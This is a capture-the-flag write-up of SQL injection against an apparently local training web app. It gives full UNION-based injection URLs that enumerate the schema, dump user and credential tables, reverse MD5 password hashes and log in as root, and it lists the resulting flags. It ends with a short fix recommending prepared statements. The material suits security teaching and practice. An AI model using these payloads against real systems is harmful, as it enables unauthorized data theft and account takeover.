# SQL injection
## Table users
The member search page allows SQL injection.
http://192.168.99.100/?page=member

Searching for user ID 5 returns the following: `First name: Flag \n Surname: GetThe`. ID 4 and 6 don't exist.

Putting the following query in the member search input will get us the DB schema:
`1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns`
http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#
This reveals that the users table has the following columns:
`user_id, first_name, last_name, town, country, planet, Commentaire, countersign`

The following query will reveal something about GetThe Flag (the second query needs to have exactly 2 columns):
`1 AND 1=2 UNION SELECT Commentaire, countersign FROM users WHERE 1=1`
http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+Commentaire%2C+countersign+FROM+users+WHERE+1%3D1&Submit=Submit#
Commentaire: `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
countersign: `5ff9d0165b4f92b14994e5c685cdce28`
Looks like hex but that only returns garbage. Paste into Google and you get a few results for reverse MD5 hashes. It decodes as `FortyTwo`.
https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28

sha256(`fortytwo`) =>
Flag: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## Table list_images
With the link above we can find out that there is a table called `list_images`:
(http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#)

Its schema is:
`id, url, title, comment`

This table is in a different database so we need to use a different URL (`page=searchimg`) to inject it. The interesting data is in the `comment` column.
http://192.168.99.100/?page=searchimg&id=1+AND+1%3D2+UNION+SELECT+comment%2C+title+FROM+list_images+WHERE+1%3D1&Submit=Submit#

ID 5's comment is `If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`

It decodes as `albatroz`: https://md5.gromweb.com/?md5=1928e8083cf461a51303633093573c46
sha256(`albatroz`) =>
Flag: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Table db_default
With the following link above we find that there is a database called `Member_Brute_Force` with table called `db_default`:
http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_schema%2C+table_name+FROM+information_schema.tables&Submit=Submit#

With the following query we find that the table has 3 columns: `id, username, password`:
http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#

With the following query we can get a list of users with their usernamd and password:
`1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default`
(http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+username%2C+password+FROM+Member_Brute_Force.db_default&Submit=Submit#)

2 accounts: `root, admin`. Both have the same password hash `3bf1114a986ba87ed28fc1b5884fc2f8`.
`reverseMD5('3bf1114a986ba87ed28fc1b5884fc2f8')` == shadow
(https://md5.gromweb.com/?md5=3bf1114a986ba87ed28fc1b5884fc2f8)

Log in using the form to get a flag:
http://192.168.99.100/index.php?page=signin&username=root&password=shadow&Login=Login#

# How to fix
Use prepared statements or escape database input.
